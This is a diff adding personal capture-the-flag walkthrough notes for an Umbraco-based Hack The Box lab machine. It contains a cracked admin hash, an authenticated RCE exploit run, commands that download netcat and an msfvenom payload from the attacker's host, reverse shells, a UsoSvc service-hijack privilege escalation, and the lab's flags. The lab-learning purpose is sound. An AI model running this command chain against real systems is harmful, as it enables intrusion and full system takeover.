@@ -1,0 +1,106 @@
+nmap -sC -sV -oN nmap 10.10.10.180 -v -A
+
+ftp-anon: Anonymous FTP login allowed (FTP code 230)
+-> nothing
+
+website
+-> user Niels
+-> login in contact page `umbraco`
+
+there are some exploits for umbraco but creds are required
+
+http://10.10.10.180/people/
+-> some users we can build a list with
+
+port 2049 = NFS
+https://resources.infosecinstitute.com/exploiting-nfs-share/#gref
+
+```
+$ showmount -e 10.10.10.180
+Export list for 10.10.10.180:
+/site_backups (everyone)
+```
+
+mount -t nfs 10.10.10.180:/site_backups /media/remote
+in /media/remote ->
+```
+$ ls -all
+total 123
+drwx------ 2 nobody 4294967294  4096 Feb 23 13:35 .
+drwxr-xr-x 4 root   root        4096 Jun 16 06:25 ..
+drwx------ 2 nobody 4294967294    64 Feb 20 12:16 App_Browsers
+drwx------ 2 nobody 4294967294  4096 Feb 20 12:17 App_Data
+drwx------ 2 nobody 4294967294  4096 Feb 20 12:16 App_Plugins
+drwx------ 2 nobody 4294967294    64 Feb 20 12:16 aspnet_client
+drwx------ 2 nobody 4294967294 49152 Feb 20 12:16 bin
+drwx------ 2 nobody 4294967294  8192 Feb 20 12:16 Config
+drwx------ 2 nobody 4294967294    64 Feb 20 12:16 css
+-rwx------ 1 nobody 4294967294   152 Nov  1  2018 default.aspx
+-rwx------ 1 nobody 4294967294    89 Nov  1  2018 Global.asax
+drwx------ 2 nobody 4294967294  4096 Feb 20 12:16 Media
+drwx------ 2 nobody 4294967294    64 Feb 20 12:16 scripts
+drwx------ 2 nobody 4294967294  8192 Feb 20 12:16 Umbraco
+drwx------ 2 nobody 4294967294  4096 Feb 20 12:16 Umbraco_Client
+drwx------ 2 nobody 4294967294  4096 Feb 20 12:16 Views
+-rwx------ 1 nobody 4294967294 28539 Feb 20 00:57 Web.config
+```
+
+in web.config:
+```
+<network host="127.0.0.1" userName="username" password="password" />
+```
+
+in App_Data/Umbraco.sdf: `Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d`
+
+-> crack b8be16afba8c314ad33d812f22a04991b90e2aaa = baconandcheese
+creds admin:baconandcheese
+
+but the login page says `Your username is usually your email`
+-> admin@htb.local:baconandcheese
+
+use authenticated rce exploit:
+https://github.com/noraj/Umbraco-RCE
+
+-> python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command ls'
+
+get user flag:
+-> python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command cd /Users/Public; type user.txt'
+ee9c5897bdd17b4c9db14cad7333ca29
+
+get a rev shell -> upload nc64.exe
+python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command cd /Users/Public; wget http://10.10.14.44:4444/nc64.exe -o nc.exe'
+then execute it
+python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command cd /Users/Public; ./nc.exe 10.10.14.44 4444 -e cmd.exe'
+-> I HAVE A SHELL as `iis apppool\defaultapppool`
+
+lets enum with winPEAS
+cp /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe .
+
+-> dl on target with wget
+python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command cd /Users/Public; wget http://10.10.14.44:4444/winPEAS.exe -o winPEAS.exe'
+
+```
+    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
+    UsoSvc: AllAccess, Start
+```
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#example-with-windows-10---cve-2019-1322-usosvc
+
+```
+> sc.exe stop UsoSvc
+> sc.exe config usosvc binPath="C:\Users\Public\nc.exe 10.10.14.44 4444 -e cmd.exe"
+> sc.exe start usosvc
+```
+=> fails
+
+lets try with real crafted reverse shell
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=4444 -f exe --platform windows -o revshell.exe
+python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command cd /Users/Public; wget http://10.10.14.44:4444/revshell.exe -o revshell.exe'
+```
+
+sc config usosvc binpath="c:\users\public\revshell.exe"
+sc start usosvc
+-> shell as authority\system
+
+a723c3504901d814e60dcab814731549
